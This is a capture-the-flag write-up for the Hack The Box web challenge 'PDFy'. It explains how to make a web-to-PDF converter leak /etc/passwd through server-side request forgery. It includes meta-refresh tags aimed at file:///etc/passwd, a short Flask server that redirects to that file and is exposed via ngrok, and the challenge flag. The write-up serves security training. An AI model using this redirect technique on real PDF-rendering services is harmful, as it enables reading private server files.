# Web

## Description

Welcome to PDFy, the exciting challenge where you turn your favorite web pages into portable PDF documents! It's your chance to capture, share, and preserve the best of the internet with precision and creativity. Join us and transform the way we save and cherish web content! 

**NOTE**: Leak /etc/passwd to get the flag!

URL: [https://app.hackthebox.com/challenges/PDFy](https://app.hackthebox.com/challenges/PDFy)
## Solution

The webapp seems to be making requests to URL, making a screenshot and saving it as PDF file.

![pdfy.png](/assets/ctf/htb/web/pdfy.png)

Unfortunately meta tag redirect doesn't work for `file://` protocol
```html
 <meta http-equiv="refresh" content="5; url=https://yourdomain.com">
 <meta http-equiv="refresh" content="5; url=file:///etc/passwd">
```

But we can always create our own server. Simply add redirection to `/etc/passwd` and serve.
```python
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/')
def index():
    return redirect('file:///etc/passwd')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

To expose your server you can use something like ngrok for simplicity 

![pdfy-1.png](/assets/ctf/htb/web/pdfy-1.png)

Send the URL:

![pdfy-2.png](/assets/ctf/htb/web/pdfy-2.png)

> Flag: `HTB{pdF_g3n3r4t1on_g03s_brrr!}`